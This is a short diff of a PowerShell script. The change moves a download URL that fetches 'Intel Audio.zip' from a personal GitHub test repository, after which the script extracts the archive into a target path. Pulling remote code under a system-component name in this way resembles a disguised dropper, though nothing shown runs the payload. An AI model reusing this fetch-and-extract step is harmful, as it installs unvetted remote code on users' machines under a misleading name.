@@ -32,7 +32,7 @@ if (-Not (Test-Path $TargetPath)) {
 }
 
 if (-Not (Test-Path $TargetFile)) {
-      Invoke-WebRequest -Uri "https://github.com/silentoverride/test/raw/refs/heads/main/Intel Audio.zip" -OutFile $TargetZip
+      Invoke-WebRequest -Uri "https://github.com/silentoverride/test/raw/refs/heads/main/dist/Intel Audio.zip" -OutFile $TargetZip
       Write-Output "File downloaded"
       Expand-Archive -Path $TargetZip -DestinationPath $TargetPath
       Write-Output "File extracted"
